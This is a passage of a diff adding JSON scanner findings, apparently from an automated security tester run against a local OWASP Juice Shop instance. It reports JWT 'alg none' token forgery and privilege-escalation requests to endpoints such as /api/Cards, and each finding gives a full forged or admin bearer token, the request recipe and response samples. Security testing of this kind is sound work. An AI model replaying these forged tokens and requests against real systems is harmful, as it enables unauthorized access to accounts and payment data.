+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJkYXRhIjp7ImlkIjoyNywidXNlcm5hbWUiOiIiLCJlbWFpbCI6Imhkd3BfdXNlckB0ZXN0LmxvY2FsIiwicGFzc3dvcmQiOiI2NmFmOGEyMTM5MTU3NTc4YjdiMzgyYjRjMGFmM2UyNCIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDktMTEgMTY6Mzg6MzIuMTA3ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDktMTEgMTY6Mzg6MzIuMTA3ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImJpZCI6OCwiaWF0IjoxNzg5MTQ0NzEyfQ."
+        },
+        "body": null,
+        "query_params": {},
+        "path_params": {},
+        "raw_body_override": null
+      },
+      "winning_response_sample": "<!--\n  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta charset=\"utf-8\">\n  <title>OWASP Juice Shop</title>\n  <meta name=\"description\" content=\"Probably the most modern and sophisticated insecure web application\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n  <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">\n  <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>\n  <style>@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isQFJXGdg.woff2) format('woff2');unicode-range:U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isRFJXGdg.woff2) format('woff2');unicode-range:U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isfFJU.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}</style>\n  <link id=\"favicon\" rel=\"icon\" type=\"image/x-icon\" href=\"assets/public/favicon_js.ico\">\n  <script>\n    window.addEventListener(\"load\", function(){\n      window.cookieconsent.initialise({\n        \"palette\": {\n          \"popup\": { \"background\": \"var(--theme-primary)\", \"text\": \"var(--theme-text)\" },\n          \"button\": { \"background\": \""
+    },
+    "remediation_hint": "Valider le token JWT avec un algorithme fixe et verifie la signature.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-3d97014c",
+    "hypothesis_id": "HYP-bb41aead",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.9336,
+    "confidence_breakdown": {
+      "oracle_strength": 0.9,
+      "reproducibility": 1.0,
+      "observation_quality": 0.7737,
+      "behavioral_specificity": 0.95,
+      "experiment_coverage": 1.0,
+      "overall": 0.9336,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": {
+      "v1_score": 0.9336,
+      "v2_score": 0.5428,
+      "ml_score": 0.0,
+      "signals": {
+        "oracle_strength": 0.9,
+        "reproducibility": 1.0,
+        "observation_quality": 0.7737,
+        "behavioral_specificity": 0.95,
+        "experiment_coverage": 1.0,
+        "temporal_signal": 0.0,
+        "crossrole_signal": 0.0,
+        "invariant_violated": 0.0,
+        "waf_bypass_success": 0.0,
+        "causal_depth": 0.3333333333333333
+      },
+      "top_contributors": [
+        {
+          "dimension": "reproducibility",
+          "raw_value": 1.0,
+          "weight": 1.6547,
+          "contribution": 1.6547,
+          "label": "Reproductibilité"
+        },
+        {
+          "dimension": "oracle_strength",
+          "raw_value": 0.9,
+          "weight": 1.4023,
+          "contribution": 1.2621,
+          "label": "Force du verdict oracle"
+        },
+        {
+          "dimension": "behavioral_specificity",
+          "raw_value": 0.95,
+          "weight": 1.059,
+          "contribution": 1.0061,
+          "label": "Spécificité comportementale"
+        },
+        {
+          "dimension": "causal_depth",
+          "raw_value": 0.3333,
+          "weight": 1.0173,
+          "contribution": 0.3391,
+          "label": "Profondeur de causalité (replays)"
+        },
+        {
+          "dimension": "observation_quality",
+          "raw_value": 0.7737,
+          "weight": 0.3798,
+          "contribution": 0.2939,
+          "label": "Qualité des observations"
+        }
+      ],
+      "verdict_rationale": "Principaux signaux : Reproductibilité (+1.65), Force du verdict oracle (+1.26), Spécificité comportementale (+1.01)"
+    },
+    "owasp_category": "A01:2021",
+    "cwe_id": "CWE-284",
+    "severity": "HIGH",
+    "affected_endpoints": [
+      "/rest/image-captcha/"
+    ],
+    "proof": {
+      "experiments": [
+        "EXP-386699f1",
+        "EXP-d767d16f",
+        "EXP-6167d05c"
+      ],
+      "diffs": [
+        "DIFF-8c701536"
+      ],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/rest/image-captcha/",
+        "2. Avec les credentials de l'attaquant",
+        "3. Observer : Privilege escalation succeeded: endpoint returned 200 for unauthorized role"
+      ],
+      "mutation_type": "privilege_escalation",
+      "winning_request": {
+        "method": "GET",
+        "url": "http://localhost:3000/rest/image-captcha/",
+        "headers": {
+          "host": "localhost:3000",
+          "accept": "*/*",
+          "accept-encoding": "gzip, deflate, br, zstd",
+          "connection": "keep-alive",
+          "user-agent": "python-httpx/0.28.1",
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wOS0xMSAxMTo0Njo1MS42MDMgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wOS0xMSAxMTo0Njo1MS42MDMgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3ODkxNDQ3MDB9.KRFLIQZi8sTpIgP6Xik76J5R2ZJxnU2BIt-seZ19kmNz8GJ6UqjlpMJ3EPZk2wf2dnIHZ2N0dpvM9RIDjZywQOXd2nms5iV7HzzTSByuUdJx4gbfL8Mf0vYe_mS2RQ_BmkZ2jFEvff-G4qhA1zY06-hAmr5BFIfrNKae33jcyE8"
+        },
+        "body": null,
+        "query_params": {},
+        "path_params": {},
+        "raw_body_override": null
+      },
+      "winning_response_sample": "{'image': '<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"150\" height=\"50\" viewBox=\"0,0,150,50\"><path fill=\"#e948e9\" d=\"M45.67 29.79L45.85 29.97L45.81 29.92Q45.45 29.80 45.15 29.80L45.09 29.74L45.14 29.79Q43.92 29.90 42.47 30.74L42.46 30.73L42.32 30.59Q41.17 31.87 41.17 33.77L41.07 33.68L41.14 33.75Q41.10 37.14 42.63 38.47L42.59 38.43L42.58 38.42Q43.59 39.66 45.87 39.66L45.80 39.58L45.86 39.65Q46.17 39.72 46.47 39.72L46.42 39.67L46.41 39.67Q48.21 39.75 49.35 38.11L49.26 38.02L49.16 37.92Q50.29 36.50 50.21 34.71L50.14 34.64L50.16 34.66Q50.32 34.29 50.32 33.87L50.23 33.78L50.24 33.79Q50.22 31.98 48.85 30.81L48.98 30.95L48.94 30.91Q47.61 29.78 45.82 29.94ZM50.19 39.98L50.30 40.09L50.31 40.10Q49.30 42.02 45.57 42.13L45.51 42.07L45.55 42.12Q42.15 42.22 40.55 40.62L40.47 40.53L40.41 40.48Q39.15 38.92 38.35 34.12L38.16 33.93L38.26 34.03Q38.04 32.36 38.04 31.11L38.05 31.11L37.93 30.99Q37.95 29.22 38.67 28.16L38.63 28.11L38.61 28.09Q39.99 26.74 42.96 26.74L43.05 26.82L42.94 26.71Q49.33 26.79 51.24 29.38L51.16 29.31L51.17 29.31Q51.37 28.52 51.79 26.92L51.83 26.97L51.88 27.02Q53.09 26.66 55.53 25.86L55.56 25.90L55.58 25.91Q53.19 31.60 52.96 37.92L52.92 37.88L52.83 37.79Q52.60 43.95 54.73 49.78L54.85 49.89L54.68 49.73Q53.10 49.25 51.31 48.98L51.32 48.99L51.25 48.92Q50.40 45.02 50.28 40.07ZM51.03 49.27L51.09 49.33L51.08 49.32Q51.73 49.40 53.13 49.70L53.10 49.67L53.05 49.62Q53.44 50.51 54.01 51.91L54.01 51.91L53.91 51.81Q56.61 52.64 58.89 53.93L58.79 53.84L58.88 53.92Q54.85 47.34 54.85 38.81L54.78 38.75L54.80 38.77Q54.80 32.40 57.27 26.62L57.24 26.59L57.24 26.59Q56.51 26.85 55.14 27.49L55.21 27.56L55.12 27.48Q55.54 26.79 56.19 25.23L56.16 25.20L56.21 25.26Q54.56 25.70 51.37 26.58L51.35 26.56L51.48 26.69Q51.30 27.20 51.00 28.38L51.01 28.39L51.05 28.43Q49.04 26.53 42.91 26.38L42.82 26.29L42.89 26.36Q39.57 26.16 38.20 27.65L38.26 27.71L38.29 27.74Q37.61 28.96 37.65 30.87L37.53 30.74L37.55 30.77Q37.64 33.75 38.63 37.52L38.72 37.61L38.64 37.53Q39.33 39.97 40.25 40.93L40.16 40.83L40.64"
+    },
+    "remediation_hint": "Implementer un controle de role explicite sur cet endpoint.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-59a9d903",
+    "hypothesis_id": "HYP-ac3217e1",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.9461,
+    "confidence_breakdown": {
+      "oracle_strength": 0.95,
+      "reproducibility": 1.0,
+      "observation_quality": 0.7737,
+      "behavioral_specificity": 0.95,
+      "experiment_coverage": 1.0,
+      "overall": 0.9461,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": {
+      "v1_score": 0.9461,
+      "v2_score": 0.5684,
+      "ml_score": 0.0,
+      "signals": {
+        "oracle_strength": 0.95,
+        "reproducibility": 1.0,
+        "observation_quality": 0.7737,
+        "behavioral_specificity": 0.95,
+        "experiment_coverage": 1.0,
+        "temporal_signal": 0.0,
+        "crossrole_signal": 0.0,
+        "invariant_violated": 0.0,
+        "waf_bypass_success": 0.0,
+        "causal_depth": 0.3333333333333333
+      },
+      "top_contributors": [
+        {
+          "dimension": "reproducibility",
+          "raw_value": 1.0,
+          "weight": 1.6586,
+          "contribution": 1.6586,
+          "label": "Reproductibilité"
+        },
+        {
+          "dimension": "oracle_strength",
+          "raw_value": 0.95,
+          "weight": 1.4115,
+          "contribution": 1.3409,
+          "label": "Force du verdict oracle"
+        },
+        {
+          "dimension": "behavioral_specificity",
+          "raw_value": 0.95,
+          "weight": 1.0694,
+          "contribution": 1.0159,
+          "label": "Spécificité comportementale"
+        },
+        {
+          "dimension": "causal_depth",
+          "raw_value": 0.3333,
+          "weight": 1.0186,
+          "contribution": 0.3395,
+          "label": "Profondeur de causalité (replays)"
+        },
+        {
+          "dimension": "observation_quality",
+          "raw_value": 0.7737,
+          "weight": 0.383,
+          "contribution": 0.2963,
+          "label": "Qualité des observations"
+        }
+      ],
+      "verdict_rationale": "Principaux signaux : Reproductibilité (+1.66), Force du verdict oracle (+1.34), Spécificité comportementale (+1.02)"
+    },
+    "owasp_category": "A02:2021",
+    "cwe_id": "CWE-347",
+    "severity": "HIGH",
+    "affected_endpoints": [
+      ""
+    ],
+    "proof": {
+      "experiments": [
+        "EXP-0f28deda",
+        "EXP-0584addd",
+        "EXP-ede80cda"
+      ],
+      "diffs": [
+        "DIFF-8dd1bf94"
+      ],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000",
+        "2. Avec les credentials de l'attaquant",
+        "3. Observer : JWT alg_none: token manipule accepte (200) -- validation JWT defaillante"
+      ],
+      "mutation_type": "jwt_manipulation",
+      "winning_request": {
+        "method": "GET",
+        "url": "http://localhost:3000",
+        "headers": {
+          "host": "localhost:3000",
+          "accept": "*/*",
+          "accept-encoding": "gzip, deflate, br, zstd",
+          "connection": "keep-alive",
+          "user-agent": "python-httpx/0.28.1",
+          "authorization": "[REDACTED]",
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJkYXRhIjp7ImlkIjoyNywidXNlcm5hbWUiOiIiLCJlbWFpbCI6Imhkd3BfdXNlckB0ZXN0LmxvY2FsIiwicGFzc3dvcmQiOiI2NmFmOGEyMTM5MTU3NTc4YjdiMzgyYjRjMGFmM2UyNCIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDktMTEgMTY6Mzg6MzIuMTA3ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDktMTEgMTY6Mzg6MzIuMTA3ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImJpZCI6OCwiaWF0IjoxNzg5MTQ0NzEyfQ."
+        },
+        "body": null,
+        "query_params": {},
+        "path_params": {},
+        "raw_body_override": null
+      },
+      "winning_response_sample": "<!--\n  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta charset=\"utf-8\">\n  <title>OWASP Juice Shop</title>\n  <meta name=\"description\" content=\"Probably the most modern and sophisticated insecure web application\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n  <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">\n  <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>\n  <style>@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isQFJXGdg.woff2) format('woff2');unicode-range:U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isRFJXGdg.woff2) format('woff2');unicode-range:U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isfFJU.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}</style>\n  <link id=\"favicon\" rel=\"icon\" type=\"image/x-icon\" href=\"assets/public/favicon_js.ico\">\n  <script>\n    window.addEventListener(\"load\", function(){\n      window.cookieconsent.initialise({\n        \"palette\": {\n          \"popup\": { \"background\": \"var(--theme-primary)\", \"text\": \"var(--theme-text)\" },\n          \"button\": { \"background\": \""
+    },
+    "remediation_hint": "Valider le token JWT avec un algorithme fixe et verifie la signature.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-95e307e0",
+    "hypothesis_id": "HYP-3be44d2c",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.9336,
+    "confidence_breakdown": {
+      "oracle_strength": 0.9,
+      "reproducibility": 1.0,
+      "observation_quality": 0.7737,
+      "behavioral_specificity": 0.95,
+      "experiment_coverage": 1.0,
+      "overall": 0.9336,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": {
+      "v1_score": 0.9336,
+      "v2_score": 0.5574,
+      "ml_score": 0.0,
+      "signals": {
+        "oracle_strength": 0.9,
+        "reproducibility": 1.0,
+        "observation_quality": 0.7737,
+        "behavioral_specificity": 0.95,
+        "experiment_coverage": 1.0,
+        "temporal_signal": 0.0,
+        "crossrole_signal": 0.0,
+        "invariant_violated": 0.0,
+        "waf_bypass_success": 0.0,
+        "causal_depth": 0.3333333333333333
+      },
+      "top_contributors": [
+        {
+          "dimension": "reproducibility",
+          "raw_value": 1.0,
+          "weight": 1.661,
+          "contribution": 1.661,
+          "label": "Reproductibilité"
+        },
+        {
+          "dimension": "oracle_strength",
+          "raw_value": 0.9,
+          "weight": 1.4205,
+          "contribution": 1.2784,
+          "label": "Force du verdict oracle"
+        },
+        {
+          "dimension": "behavioral_specificity",
+          "raw_value": 0.95,
+          "weight": 1.0784,
+          "contribution": 1.0245,
+          "label": "Spécificité comportementale"
+        },
+        {
+          "dimension": "causal_depth",
+          "raw_value": 0.3333,
+          "weight": 1.0194,
+          "contribution": 0.3398,
+          "label": "Profondeur de causalité (replays)"
+        },
+        {
+          "dimension": "observation_quality",
+          "raw_value": 0.7737,
+          "weight": 0.3849,
+          "contribution": 0.2978,
+          "label": "Qualité des observations"
+        }
+      ],
+      "verdict_rationale": "Principaux signaux : Reproductibilité (+1.66), Force du verdict oracle (+1.28), Spécificité comportementale (+1.02)"
+    },
+    "owasp_category": "A01:2021",
+    "cwe_id": "CWE-284",
+    "severity": "HIGH",
+    "affected_endpoints": [
+      "/api/BasketItems"
+    ],
+    "proof": {
+      "experiments": [
+        "EXP-0db04fd5",
+        "EXP-169bae13",
+        "EXP-de183fea"
+      ],
+      "diffs": [
+        "DIFF-6ca09927"
+      ],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/BasketItems",
+        "2. Avec les credentials de l'attaquant",
+        "3. Observer : Privilege escalation succeeded: endpoint returned 200 for unauthorized role"
+      ],
+      "mutation_type": "privilege_escalation",
+      "winning_request": {
+        "method": "GET",
+        "url": "http://localhost:3000/api/BasketItems",
+        "headers": {
+          "host": "localhost:3000",
+          "accept": "*/*",
+          "accept-encoding": "gzip, deflate, br, zstd",
+          "connection": "keep-alive",
+          "user-agent": "python-httpx/0.28.1",
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wOS0xMSAxMTo0Njo1MS42MDMgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wOS0xMSAxMTo0Njo1MS42MDMgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3ODkxNDQ3MDB9.KRFLIQZi8sTpIgP6Xik76J5R2ZJxnU2BIt-seZ19kmNz8GJ6UqjlpMJ3EPZk2wf2dnIHZ2N0dpvM9RIDjZywQOXd2nms5iV7HzzTSByuUdJx4gbfL8Mf0vYe_mS2RQ_BmkZ2jFEvff-G4qhA1zY06-hAmr5BFIfrNKae33jcyE8"
+        },
+        "body": null,
+        "query_params": {},
+        "path_params": {},
+        "raw_body_override": null
+      },
+      "winning_response_sample": "{'status': 'success', 'data': [{'ProductId': 1, 'BasketId': 1, 'id': 1, 'quantity': 2, 'createdAt': '2026-09-11T11:46:55.272Z', 'updatedAt': '2026-09-11T11:46:55.272Z'}, {'ProductId': 2, 'BasketId': 1, 'id': 2, 'quantity': 3, 'createdAt': '2026-09-11T11:46:55.273Z', 'updatedAt': '2026-09-11T11:46:55.273Z'}, {'ProductId': 3, 'BasketId': 1, 'id': 3, 'quantity': 1, 'createdAt': '2026-09-11T11:46:55.274Z', 'updatedAt': '2026-09-11T11:46:55.274Z'}, {'ProductId': 4, 'BasketId': 2, 'id': 4, 'quantity': 2, 'createdAt': '2026-09-11T11:46:55.274Z', 'updatedAt': '2026-09-11T11:46:55.274Z'}, {'ProductId': 4, 'BasketId': 3, 'id': 5, 'quantity': 1, 'createdAt': '2026-09-11T11:46:55.275Z', 'updatedAt': '2026-09-11T11:46:55.275Z'}, {'ProductId': 4, 'BasketId': 4, 'id': 6, 'quantity': 2, 'createdAt': '2026-09-11T11:46:55.275Z', 'updatedAt': '2026-09-11T11:46:55.275Z'}, {'ProductId': 3, 'BasketId': 5, 'id': 7, 'quantity': 5, 'createdAt': '2026-09-11T11:46:55.275Z', 'updatedAt': '2026-09-11T11:46:55.275Z'}, {'ProductId': 4, 'BasketId': 5, 'id': 8, 'quantity': 2, 'createdAt': '2026-09-11T11:46:55.275Z', 'updatedAt': '2026-09-11T11:46:55.275Z'}]}"
+    },
+    "remediation_hint": "Implementer un controle de role explicite sur cet endpoint.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-5ded1327",
+    "hypothesis_id": "HYP-9d135b83",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.9336,
+    "confidence_breakdown": {
+      "oracle_strength": 0.9,
+      "reproducibility": 1.0,
+      "observation_quality": 0.7737,
+      "behavioral_specificity": 0.95,
+      "experiment_coverage": 1.0,
+      "overall": 0.9336,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": {
+      "v1_score": 0.9336,
+      "v2_score": 0.7655,
+      "ml_score": 0.0,
+      "signals": {
+        "oracle_strength": 0.9,
+        "reproducibility": 1.0,
+        "observation_quality": 0.7737,
+        "behavioral_specificity": 0.95,
+        "experiment_coverage": 1.0,
+        "temporal_signal": 0.0,
+        "crossrole_signal": 0.7,
+        "invariant_violated": 0.0,
+        "waf_bypass_success": 0.0,
+        "causal_depth": 0.3333333333333333
+      },
+      "top_contributors": [
+        {
+          "dimension": "reproducibility",
+          "raw_value": 1.0,
+          "weight": 1.5959,
+          "contribution": 1.5959,
+          "label": "Reproductibilité"
+        },
+        {
+          "dimension": "oracle_strength",
+          "raw_value": 0.9,
+          "weight": 1.3792,
+          "contribution": 1.2413,
+          "label": "Force du verdict oracle"
+        },
+        {
+          "dimension": "crossrole_signal",
+          "raw_value": 0.7,
+          "weight": 1.7543,
+          "contribution": 1.228,
+          "label": "Différence cross-rôle confirmée"
+        },
+        {
+          "dimension": "behavioral_specificity",
+          "raw_value": 0.95,
+          "weight": 1.0904,
+          "contribution": 1.0358,
+          "label": "Spécificité comportementale"
+        },
+        {
+          "dimension": "causal_depth",
+          "raw_value": 0.3333,
+          "weight": 0.9816,
+          "contribution": 0.3272,
+          "label": "Profondeur de causalité (replays)"
+        }
+      ],
+      "verdict_rationale": "Principaux signaux : Reproductibilité (+1.60), Force du verdict oracle (+1.24), Différence cross-rôle confirmée (+1.23)"
+    },
+    "owasp_category": "A01:2021",
+    "cwe_id": "CWE-284",
+    "severity": "HIGH",
+    "affected_endpoints": [
+      "/api/Cards"
+    ],
+    "proof": {
+      "experiments": [
+        "EXP-9cb1ff38",
+        "EXP-e88c24ec",
+        "EXP-5d52567f"
+      ],
+      "diffs": [
+        "DIFF-f78e4fba"
+      ],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/Cards",
+        "2. Avec les credentials de l'attaquant",
+        "3. Observer : Privilege escalation succeeded: endpoint returned 200 for unauthorized role"
+      ],
+      "mutation_type": "privilege_escalation",
+      "winning_request": {
+        "method": "GET",
+        "url": "http://localhost:3000/api/Cards",
+        "headers": {
+          "host": "localhost:3000",
+          "accept": "*/*",
+          "accept-encoding": "gzip, deflate, br, zstd",
+          "connection": "keep-alive",
+          "user-agent": "python-httpx/0.28.1",
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wOS0xMSAxMTo0Njo1MS42MDMgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wOS0xMSAxMTo0Njo1MS42MDMgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3ODkxNDQ3MDB9.KRFLIQZi8sTpIgP6Xik76J5R2ZJxnU2BIt-seZ19kmNz8GJ6UqjlpMJ3EPZk2wf2dnIHZ2N0dpvM9RIDjZywQOXd2nms5iV7HzzTSByuUdJx4gbfL8Mf0vYe_mS2RQ_BmkZ2jFEvff-G4qhA1zY06-hAmr5BFIfrNKae33jcyE8"
+        },
+        "body": null,
+        "query_params": {},
+        "path_params": {},
+        "raw_body_override": null
+      },
+      "winning_response_sample": "{'status': 'success', 'data': [{'UserId': 1, 'id': 3, 'fullName': 'Administrator', 'cardNum': '************4368', 'expMonth': 2, 'expYear': 2081}, {'UserId': 1, 'id': 4, 'fullName': 'Administrator', 'cardNum': '************8108', 'expMonth': 4, 'expYear': 2086}]}"
+    },
+    "remediation_hint": "Implementer un controle de role explicite sur cet endpoint.",
+    "confirmed_threshold_used": 0.85
+  }
+]
